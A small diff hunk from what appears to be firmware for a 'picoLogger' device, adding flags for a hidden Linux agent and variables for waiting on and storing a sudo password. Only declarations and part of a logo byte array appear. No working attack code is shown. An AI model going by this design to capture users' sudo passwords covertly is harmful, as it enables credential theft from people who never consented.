@@ -126,6 +126,13 @@ bool fromMenu = false;
 bool psAgentAdminFlag = false;
 bool psAgentHiddenFlag = false;
 bool ssAgentHiddenFlag = false;
+bool linuxAgentHiddenFlag = false;
+
+bool passwordExpected = false;
+bool commandDetected = false;
+bool passwordWaiting = true;
+String sudoPassword = "";
+
 
 const unsigned char picoLoggerLogo [] PROGMEM = {
 0x00, 0x00, 0x10, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
